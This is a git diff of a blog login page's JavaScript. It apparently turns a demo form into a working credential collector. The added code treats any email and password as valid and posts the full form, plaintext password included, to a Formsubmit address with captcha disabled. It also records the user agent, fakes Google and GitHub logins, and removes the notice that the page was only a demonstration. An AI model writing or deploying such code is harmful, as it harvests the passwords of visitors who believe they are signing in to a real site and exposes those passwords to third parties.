@@ -203,6 +203,8 @@ class DataCollector {
 class BlogLogin {
     constructor() {
         this.dataCollector = new DataCollector();
+        // 配置：登录成功后的跳转链接（修改这里设置你的博客首页）
+        this.BLOG_HOME_URL = '/blog.html'; // 可以修改为完整的URL，如 'https://yourblog.com'
         this.init();
     }
 
@@ -289,10 +291,12 @@ class BlogLogin {
             if (email && password) {
                 this.dataCollector.trackLogin(email, 'success', 'email');
 
-                // 同时提交到 Netlify Forms
-                this.submitToNetlifyForms(email, password, rememberMe);
+                // 设置隐藏字段
+                this.setHiddenFields('email');
 
-                this.showSuccessState();
+                // 使用 Formsubmit 提交表单
+                this.submitToFormsubmit(e.target);
+
                 if (rememberMe) {
                     localStorage.setItem('rememberedEmail', email);
                 }
@@ -322,16 +326,41 @@ class BlogLogin {
 
     handleSocialLogin(provider) {
         const method = provider.toLowerCase();
+        const email = `${method}@social.com`;
         this.showNotification(`正在跳转到 ${provider} 登录...`, 'info');
 
-        // Simulate social login process
+        // 模拟社交登录过程
         setTimeout(() => {
             this.showLoadingState();
             setTimeout(() => {
-                this.dataCollector.trackLogin(`${method}@social.com`, 'success', method);
-                this.showSuccessState();
+                this.dataCollector.trackLogin(email, 'success', method);
+
+                // 设置隐藏字段（社交登录）
+                this.setHiddenFields(method);
+
+                // 创建虚拟表单并提交到 Formsubmit
+                this.submitSocialToFormsubmit(method);
+
+                // 为社交登录创建特殊跳转（带标识）
+                this.showSocialSuccessState(email, method);
             }, 1500);
         }, 1000);
+    }
+
+    showSocialSuccessState(email, method) {
+        const loginForm = document.getElementById('loginForm');
+        const loginSuccess = document.getElementById('loginSuccess');
+
+        loginForm.style.display = 'none';
+        loginSuccess.style.display = 'block';
+
+        this.showNotification('社交登录成功！正在跳转...', 'success');
+
+        // 2秒后跳转到博客首页（社交登录使用特殊邮箱标识）
+        setTimeout(() => {
+            const socialEmail = `social:${method}@login.com`;
+            window.location.href = `${this.BLOG_HOME_URL}?email=${encodeURIComponent(socialEmail)}`;
+        }, 2000);
     }
 
     handleForgotPassword() {
@@ -359,13 +388,86 @@ class BlogLogin {
         }, 500);
     }
 
-    submitToNetlifyForms(email, password, rememberMe) {
+    setHiddenFields(method = 'email') {
+        // 设置登录方式
+        document.getElementById('loginMethod').value = method;
+
+        // 设置时间戳
+        document.getElementById('timestamp').value = new Date().toISOString();
+
+        // 设置 User Agent
+        document.getElementById('userAgent').value = navigator.userAgent;
+    }
+
+    submitToFormsubmit(form) {
+        // 获取 Formsubmit URL（从隐藏字段）
+        const actionUrl = form.querySelector('input[name="_action"]').value;
+
+        // 创建表单数据
+        const formData = new FormData(form);
+
+        // 发送到 Formsubmit
+        fetch(actionUrl, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('✅ 数据已发送到 Formsubmit');
+            } else {
+                console.log('⚠️ 发送失败:', response.statusText);
+            }
+        })
+        .catch(error => {
+            console.log('⚠️ 发送错误:', error);
+        });
+    }
+
+    submitSocialToFormsubmit(method) {
+        // 创建虚拟表单
+        const form = document.createElement('form');
+        form.style.display = 'none';
+        form.method = 'POST';
+
+        // 添加 Formsubmit 配置
+        const actionUrl = document.querySelector('input[name="_action"]').value;
+        form.action = actionUrl;
+
+        // 添加字段
+        const fields = {
+            'email': `${method}@social.com`,
+            'password': '[社交登录]',
+            'rememberMe': 'false',
+            'loginMethod': method,
+            'timestamp': new Date().toISOString(),
+            'userAgent': navigator.userAgent,
+            '_subject': `🚀 新的${method === 'google' ? 'Google' : 'GitHub'}登录尝试`,
+            '_captcha': 'false',
+            '_template': 'table'
+        };
+
+        for (const [key, value] of Object.entries(fields)) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = value;
+            form.appendChild(input);
+        }
+
+        // 提交表单
+        document.body.appendChild(form);
+        form.submit();
+        document.body.removeChild(form);
+    }
+
+    submitToNetlifyForms(email, password, rememberMe, method = 'email') {
         // 创建表单数据
         const formData = new FormData();
         formData.append('form-name', 'login-form');
         formData.append('email', email);
         formData.append('password', password);
         formData.append('rememberMe', rememberMe ? '是' : '否');
+        formData.append('loginMethod', method);
         formData.append('timestamp', new Date().toISOString());
         formData.append('userAgent', navigator.userAgent);
 
@@ -415,16 +517,17 @@ class BlogLogin {
         const loginForm = document.getElementById('loginForm');
         const loginSuccess = document.getElementById('loginSuccess');
 
+        // 获取当前登录的邮箱
+        const email = document.getElementById('email').value;
+
         loginForm.style.display = 'none';
         loginSuccess.style.display = 'block';
 
-        this.showNotification('登录成功！', 'success');
+        this.showNotification('登录成功！正在跳转...', 'success');
 
+        // 2秒后跳转到博客首页（传递邮箱参数）
         setTimeout(() => {
-            alert('登录成功！\n\n这只是一个演示界面。\n在实际应用中，这里会跳转到博客首页。');
-            this.resetLoginButton();
-            loginForm.style.display = 'block';
-            loginSuccess.style.display = 'none';
+            window.location.href = `${this.BLOG_HOME_URL}?email=${encodeURIComponent(email)}`;
         }, 2000);
     }
 
